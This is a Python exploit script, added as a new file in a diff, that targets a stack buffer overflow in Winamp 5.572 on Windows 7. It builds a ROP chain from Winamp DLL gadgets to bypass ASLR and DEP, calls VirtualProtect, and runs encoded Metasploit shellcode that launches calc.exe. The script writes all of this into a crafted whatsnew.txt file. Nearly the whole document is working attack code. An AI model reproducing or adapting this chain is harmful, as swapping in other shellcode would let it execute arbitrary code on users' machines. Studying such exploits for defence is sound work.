@@ -1,0 +1,152 @@
+#!/usr/bin/python
+
+#Exploit Title: 	Winamp v5.572 Local BoF Exploit (Win7 ASLR and DEP Bypass)
+#Date: 			June 26, 2010
+#Author:		Node
+#Software Link:		http://download.nullsoft.com/winamp/client/winamp5572_full_emusic-7plus_en-us.exe
+#Tested on: 		Windows 7 Ultimate x64 ENG
+#Badchars: 		'\x00\xff\x5c\x2f\x0a\x0d\x20'
+#Instructions: Replace generated whatsnew.txt with original in Winamp folder, Start Winamp, rightclick the flash symbol, "Nullsoft Winamp...", Version history
+
+
+print "[+] Winamp_5.572_whatsnew.txt Win7 ASLR and DEP Bypass - by Node"
+
+version = "Winamp 5.572"
+
+rop = "A" * 540          # Offset
+rop += "\x8a\x35\x84\x07" #0x0784358A :  # PUSH ESP # POP ESI # RETN       [Module : in_wm.dll]
+rop += "A"*16
+rop += "\x8a\x3d\x14\x07" #0x07143D8A :  # PUSH ESI # SUB AL,5E # XOR EAX,EAX # POP EBP # RETN     [Module: zlib.dll]
+rop += "\xf7\xb8\x40\x07" #0x0740B8F7 :  # XCHG EAX,EBP # RETN     [Module : gen_ff.dll]
+rop += "\xd6\x5e\x65\x07" #0x07655ED6 :  # ADD ESP,30 # RETN       [Module : in_cdda.dll]
+rop += "0000" #VirtualProtect placeholder
+rop += "DDDD" #return address placeholder
+rop += "1111" #lpAddress placeholder
+rop += "2222" #dwsize placeholder
+rop += "3333" #flNewProtect placeholder
+rop += "\x60\xf6\x78\x07" # lpflOldProtect (0x0778f660 writable address in in_mp3.dll) 
+rop += "A"*24
+#---------------Grab a kernel32 pointer from the stack--------------------
+rop += "\x74\x6c\x96\x07" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll]
+rop += "\x1a\x10\x09\x07" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll]
+rop += "\x3a\xd8\x8d\x07"*4 #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll]
+rop += "\x67\x40\x5b\x07" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll]
+rop += "\x65\x72\x0a\x07" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll]
+rop += "\x67\x40\x5b\x07" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll]
+rop += "\x65\x72\x0a\x07" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll]
+rop += "\x3a\xd8\x8d\x07"*3 #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll]
+rop += "\x29\x13\x09\x07"*29 #0x07091329 :  # INC EAX # RETN  [Module : libsndfile.dll]
+rop += "\x74\x6c\x96\x07" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll]
+rop += "\xb3\x6a\x6c\x07" #0x076C6AB3 :  # SUB EAX,EDX # RETN      [Module : in_flv.dll]
+rop += "\xa7\x41\x11\x07" #0x071141A7 :  # MOV EAX,DWORD PTR DS:[EAX] # RETN       [Module : tataki.dll]
+#----------------------EAX=kernel32, ESI=start----------------------
+
+#---------------Change kernel32 pointer to VirtualProtect()-----------------
+rop += "\x74\x6c\x96\x07" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll]
+rop += "\x1a\x10\x09\x07" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll]
+rop += "\x3a\xd8\x8d\x07"*4 #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll] 104
+rop += "\x67\x40\x5b\x07" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll]
+rop += "\x65\x72\x0a\x07" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 208
+rop += "\x67\x40\x5b\x07" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll]
+rop += "\x65\x72\x0a\x07" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 410
+rop += "\x67\x40\x5b\x07" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll]
+rop += "\x65\x72\x0a\x07" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 820
+rop += "\x67\x40\x5b\x07" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll]
+rop += "\x65\x72\x0a\x07" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 1040
+rop += "\x67\x40\x5b\x07" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll]
+rop += "\x65\x72\x0a\x07" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 2080
+rop += "\x08\x13\x8d\x07" #0x078D1308 :  # SUB EAX,41 # RETN       [Module : ml_disc.dll] 203f
+rop += "\xc6\xd7\x8d\x07" #0x078DD7C6 :  # SUB EAX,20 # RETN       [Module : ml_disc.dll] 201f
+rop += "\xec\x11\x09\x07"*4 #0x070911EC :  # DEC EAX # RETN  [Module : libsndfile.dll] 201b
+rop += "\x74\x6c\x96\x07" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll]
+rop += "\x10\x7d\x0b\x07" #0x070B7D10 :  # ADD EAX,EDX # RETN      [Module : libsndfile.dll]
+#---------------EAX=VirtualProtect(), ESI=start-----------------
+
+#-------------Write VirtualProtect() to stack----------------------
+rop += "\x82\x55\x40\x07"*12 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll]
+rop += "\x43\x5d\x6f\x07" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll]
+#---------------EAX=VirtualProtect(),ESI=start+12(VP)-----------
+
+
+#-------------Write return address----------------------
+rop += "\xdd\xb7\x3e\x07" #0x073EB7DD :  # MOV EAX,ESI # RETN      [Module : gen_ff.dll]
+rop += "\x74\x6c\x96\x07" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll]
+rop += "\x1a\x10\x09\x07" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll]
+rop += "\x45\x35\x10\x08" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac]
+rop +="AAAA"
+rop += "\x45\x35\x10\x08" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac]
+rop +="AAAA"
+rop += "\x45\x35\x10\x08" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac]
+rop +="AAAA"
+rop += "\x10\x7d\x0b\x07" #0x070B7D10 :  # ADD EAX,EDX # RETN      [Module : libsndfile.dll]
+rop += "\x82\x55\x40\x07"*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll]
+rop += "\x43\x5d\x6f\x07" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll]
+#------------EAX=start+12+312(shellcode),EDX=start+12(VP),ESI=start+16------------
+
+#-------------Write placeholder 1----------------------
+rop += "\x82\x55\x40\x07"*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll]
+rop += "\x43\x5d\x6f\x07" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll]
+#------------EAX=start+12+312(shellcode),EDX=start+12(VP),ESI=start+20------------
+
+#-------------Write placeholder 2----------------------
+rop += "\x89\xb3\x34\x08" #0x0834B389 :  # XCHG EAX,EBX # RETN     [Module : jnetlib.w5s]
+rop += "\x1a\x10\x09\x07" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll]
+rop += "\x45\x35\x10\x08" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac]
+rop +="AAAA"
+rop += "\x45\x35\x10\x08" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac]
+rop +="AAAA"
+rop += "\x45\x35\x10\x08" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac]
+rop +="AAAA"
+rop += "\x82\x55\x40\x07"*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll]
+rop += "\x43\x5d\x6f\x07" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll]
+#---------EAX = 0x30c(size 780),EBX = shellcode, ESI=start+24(placeholder 2), EDX=start+12(VP)--------------
+
+#-------------Write placeholder 3----------------------
+rop += "\x1a\x10\x09\x07" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll]
+rop += "\x3a\xd8\x8d\x07" #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll]
+rop += "\xec\x11\x09\x07" #0x070911EC :  # DEC EAX # RETN  [Module : libsndfile.dll]
+rop += "\x82\x55\x40\x07"*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll]
+rop += "\x43\x5d\x6f\x07" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll]
+rop += "\x74\x6c\x96\x07" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll]
+#--------EAX=start+12(VP), EBX=start+12+312(shellcode), ESI=start+28-----------
+
+
+#----------fix EBP problem after call return----------------
+rop += "\x89\xb3\x34\x08" #0x0834B389 :  # XCHG EAX,EBX # RETN     [Module : jnetlib.w5s]
+rop += "\x1a\x10\x09\x07" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll]
+rop += "\xf7\xb8\x40\x07" #0x0740B8F7 :  # XCHG EAX,EBP # RETN     [Module : gen_ff.dll]
+rop += "\x89\xb3\x34\x08" #0x0834B389 :  # XCHG EAX,EBX # RETN     [Module : jnetlib.w5s]
+rop += "\x85\xe0\x09\x07" #0x0709E085 :  # ADD EBP,EAX # RETN      [Module : libsndfile.dll]
+#---------EAX=vp, EBX=?, EDX=40, ESI=start+28, EBP=vp--------
+
+#----------------go to VirtualProtect()-------------------
+rop += "\xc1\xbb\x3c\x07" #0x073CBBC1 :  # XCHG EAX,ESP # RETN     [Module : gen_ff.dll]
+#------------------------bang!-----------------------------
+
+nops = "\x90"*304
+
+# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\xff\x5c\x2f\x0a\x0d\x20' -t perl
+shellcode = ("\xbb\xd2\xaa\xfa\x33\x31\xc9\xb1\x33\xdb\xd3\xd9\x74\x24" +
+"\xf4\x5e\x83\xc6\x04\x31\x5e\x0b\x03\x5e\xd9\x48\x0f\xcf" +
+"\x35\x05\xf0\x30\xc5\x76\x78\xd5\xf4\xa4\x1e\x9d\xa4\x78" +
+"\x54\xf3\x44\xf2\x38\xe0\xdf\x76\x95\x07\x68\x3c\xc3\x26" +
+"\x69\xf0\xcb\xe5\xa9\x92\xb7\xf7\xfd\x74\x89\x37\xf0\x75" +
+"\xce\x2a\xfa\x24\x87\x21\xa8\xd8\xac\x74\x70\xd8\x62\xf3" +
+"\xc8\xa2\x07\xc4\xbc\x18\x09\x15\x6c\x16\x41\x8d\x07\x70" +
+"\x72\xac\xc4\x62\x4e\xe7\x61\x50\x24\xf6\xa3\xa8\xc5\xc8" +
+"\x8b\x67\xf8\xe4\x06\x79\x3c\xc2\xf8\x0c\x36\x30\x85\x16" +
+"\x8d\x4a\x51\x92\x10\xec\x12\x04\xf1\x0c\xf7\xd3\x72\x02" +
+"\xbc\x90\xdd\x07\x43\x74\x56\x33\xc8\x7b\xb9\xb5\x8a\x5f" +
+"\x1d\x9d\x49\xc1\x04\x7b\x3c\xfe\x57\x23\xe1\x5a\x13\xc6" +
+"\xf6\xdd\x7e\x8d\x09\x6f\x05\xe8\x09\x6f\x06\x5b\x61\x5e" +
+"\x8d\x34\xf6\x5f\x44\x71\x08\x2a\xc5\xd0\x80\xf3\x9f\x60" +
+"\xcd\x03\x4a\xa6\xeb\x87\x7f\x57\x08\x97\xf5\x52\x55\x1f" +
+"\xe5\x2e\xc6\xca\x09\x9c\xe7\xde\x69\x43\x7b\x82\x43\xe6" +
+"\xfb\x21\x9c\xe2");
+
+trash = "B" * 600
+
+expfile = open('whatsnew.txt','w')
+expfile.write(version + rop + nops + shellcode + trash)
+print "[+] whatsnew.txt generated."
+expfile.close()
